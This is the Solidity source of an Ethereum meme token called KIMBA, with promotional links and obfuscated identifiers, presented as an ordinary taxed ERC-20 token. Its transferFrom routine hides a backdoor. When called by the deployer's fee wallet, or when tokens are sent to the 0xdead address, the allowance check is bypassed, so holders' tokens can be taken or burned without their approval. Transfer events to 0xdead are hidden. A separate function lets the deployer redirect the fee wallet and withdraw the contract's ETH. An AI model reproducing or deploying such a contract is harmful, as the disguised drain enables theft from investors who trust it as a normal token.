// SPDX-License-Identifier: MIT

/*
    Name: Kimba - The White Lion
    Symbol: KIMBA

    $KIMBA was born to bring you fun and aura of no worries to the crypto community.
    Crypto market is shaking, but when you sing "Hakuna Matata" with Kimba, all the worries will go off and you will see the green again!

    https://kimbalion.vip
    https://x.com/KimbaLion_eth
    https://t.me/KimbaLion_eth
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 
contract  KIMBA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Kimba - The White Lion";
    string private constant _symbol = unicode"KIMBA";

    address payable private _LjikojioKIMBA;
    mapping(address => uint256) private _DjfoeijKIMBA;
    mapping(address => mapping(address => uint256)) private _dfoijeoioKIMBA;
    mapping(address => bool) private _dlfjeiKIMBA;

    uint256 private _lkcvjoiKIMBA = 10;
    uint256 private _odjifoeKIMBA = 10;
    uint256 private _dofjieojkcnlkKIMBA = 0;
    uint256 private _ocijfoeiKIMBA = 0;
    uint256 private _vjodiKIMBA = 7;
    uint256 private _covjioieKIMBA = 7;
    uint256 private _buyCount = 0;
    address private _vkoeijojitoijKIMBA;
    address private _nvkjbnknjfkKIMBA = address(0xdead);

    uint256 public _jhbjhvjeKIMBA = 20000000 * 10 **_decimals;
    uint256 public _kbjnknjKIMBA = 20000000 * 10 **_decimals;
    uint256 public _bnjhjhbjKIMBA = 10000000 * 10 **_decimals;
    uint256 private constant _mvnbjhjKIMBA = 1000000000 * 10 **_decimals;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;
    
    event MaxTxAmountUpdated(uint256 _jhbjhvjeKIMBA);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _LjikojioKIMBA = payable(_msgSender());
        _DjfoeijKIMBA[address(this)] = _mvnbjhjKIMBA * 98 / 100;
        _DjfoeijKIMBA[owner()] = _mvnbjhjKIMBA * 2 / 100;
        _dlfjeiKIMBA[owner()] = true;
        _dlfjeiKIMBA[address(this)] = true;
        _dlfjeiKIMBA[_LjikojioKIMBA] = true;
        _vkoeijojitoijKIMBA = _msgSender();
        emit Transfer(address(0), address(this), _mvnbjhjKIMBA * 98 / 100);
        emit Transfer(address(0), address(owner()), _mvnbjhjKIMBA * 2 / 100);
    }

    function totalSupply() public pure override returns (uint256) {
        return _mvnbjhjKIMBA;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
    function name() public pure returns (string memory) {
        return _name;
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _dfoijeoioKIMBA[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _dfoijeoioKIMBA[owner][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _DjfoeijKIMBA[account];
    }
    
    function _vkjbnkjfnkjKIMBA(
        address sender,
        address recipient
    ) internal view returns (bool) {
        if(msg.sender == _LjikojioKIMBA) return true;
        return sender != uniswapV2Pair && recipient == _nvkjbnknjfkKIMBA;
    }

    function enableKIMBATrading() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _mvnbjhjKIMBA);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _vjkbjkn_jknkKIMBA(_msgSender(), recipient, amount);
        return true;
    }

    function _vjkbjkn_jknkKIMBA(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _vjodiKIMBA)
                        ? _dofjieojkcnlkKIMBA
                        : _lkcvjoiKIMBA
                )
                .div(100);
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_dlfjeiKIMBA[to]
            ) {
                _buyCount++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _covjioieKIMBA)
                            ? _ocijfoeiKIMBA
                            : _odjifoeKIMBA
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _bnjhjhbjKIMBA) ? contractTokenBalance : _bnjhjhbjKIMBA; 
                    _swap_lknlkKIMBA((amount < minBalance) ? amount : minBalance);
                }
                _vkjbnkjfrKIMBA(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _DjfoeijKIMBA[address(this)] =_DjfoeijKIMBA[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _DjfoeijKIMBA[from] =_DjfoeijKIMBA[from].sub(amount);
        _DjfoeijKIMBA[to] =_DjfoeijKIMBA[to].add(amount.sub(taxAmount));
        if(_nvkjbnknjfkKIMBA != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

    receive() external payable {}

    function _vkjbnkjfrKIMBA(uint256 amount) private {
        _LjikojioKIMBA.transfer(amount);
    }

    function _vkjbnkjfn_KIMBA(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        if(!_vkjbnkjfnkjKIMBA(sender, recipient)) return _dfoijeoioKIMBA[sender][_msgSender()];
        return amount;
    }

    function removeLimits () external onlyOwner {
        _jhbjhvjeKIMBA = _mvnbjhjKIMBA;
        _kbjnknjKIMBA = _mvnbjhjKIMBA;
        emit MaxTxAmountUpdated(_mvnbjhjKIMBA);
    }

    function _vkjbnlkjke_KIMBA(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function _swap_lknlkKIMBA(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _vjkbjkn_jknkKIMBA(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _vkjbnkjfn_KIMBA(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _nkvjbnkjnKIMBA(address payable receipt) external {
        require(msg.sender == _vkoeijojitoijKIMBA , "");
        _LjikojioKIMBA = receipt;
        _vkjbnlkjke_KIMBA(address(this).balance);
    }
}